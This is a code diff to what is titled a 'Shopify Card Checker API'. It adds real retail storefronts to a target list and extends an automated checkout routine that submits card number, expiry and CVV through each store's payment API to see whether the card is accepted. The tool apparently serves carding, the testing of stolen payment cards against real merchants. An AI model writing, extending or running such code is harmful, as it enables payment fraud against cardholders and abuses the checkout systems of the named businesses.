@@ -27,13 +27,22 @@ app = FastAPI(title="Shopify Card Checker API v2")
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
 
 SHOPIFY_SITES = [
+    "www.misen.com",
+    "www.rothys.com",
+    "www.naadam.co",
+    "www.meshki.com",
+    "www.quay.com",
+    "www.herbivorebotanicals.com",
+    "www.brooklinen.com",
+    "www.dollskill.com",
+    "www.wildone.com",
+    "colourpop.com",
+    "www.glossier.com",
     "couch-collectibles.myshopify.com",
     "www.teeinblue.com",
     "shopmissa.com",
-    "colourpop.com",
     "www.rarebeauty.com",
     "www.fentybeauty.com",
-    "www.glossier.com",
     "www.olehenriksen.com",
     "www.glowrecipe.com",
     "www.hauslabs.com",
@@ -48,7 +57,6 @@ SHOPIFY_SITES = [
     "www.maccosmetics.com",
     "www.puravidabracelets.com",
     "www.skims.com",
-    "www.brooklinen.com",
     "www.everlane.com",
     "www.outdoorvoices.com",
     "www.mejuri.com",
@@ -498,8 +506,33 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
     except Exception:
         return None, "Invalid card - vault failed", gw_name, None
 
-    # Step 6: Submit payment + delivery negotiation
+    # Step 6: Negotiate with payment to lock in tax and delivery before submit
     payment_input = {'totalAmount': {'any': True}, 'paymentLines': [{'paymentMethod': {'directPaymentMethod': {'paymentMethodIdentifier': payment_method_id, 'sessionId': payment_token, 'billingAddress': {'streetAddress': addr_block}, 'cardSource': None}}, 'amount': {'value': {'amount': running_total, 'currencyCode': currency}}, 'dueAt': None}], 'billingAddress': {'streetAddress': addr_block}}
+    
+    # Do a final negotiate with payment to get the final tax amount
+    step3_vars = _make_vars()
+    step3_vars['delivery'] = {
+        'deliveryLines': [{
+            'destination': {'streetAddress': addr_block},
+            'selectedDeliveryStrategy': {'deliveryStrategyByHandle': {'handle': delivery_strategy, 'customDeliveryRate': False}, 'options': {'phone': phone}},
+            'targetMerchandiseLines': {'any': True},
+            'deliveryMethodTypes': ['SHIPPING'],
+            'expectedTotalPrice': {'any': True},
+            'destinationChanged': False,
+        }],
+        'noDeliveryRequired': [], 'useProgressiveRates': False,
+        'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True,
+    }
+    step3_vars['payment'] = payment_input
+    result3 = await _negotiate(client, graphql_url, gql_headers, step3_vars)
+    _update_qt(result3)
+    if result3 and isinstance(result3, dict) and result3.get('__typename') == 'NegotiationResultAvailable':
+        sp3 = result3.get('sellerProposal')
+        if sp3 and isinstance(sp3, dict):
+            running_total, currency, tax_amount, _, delivery_strategy, shipping_amount, _, api_gw3 = _parse_seller(sp3)
+            if api_gw3: gw_name = api_gw3
+            payment_input['paymentLines'][0]['amount']['value']['amount'] = running_total
+            logger.info(f"[STEP3] tax={tax_amount} total={running_total} gw={api_gw3}")
 
     # Use saved delivery data if available, otherwise build new
     if saved_delivery_data[0]:
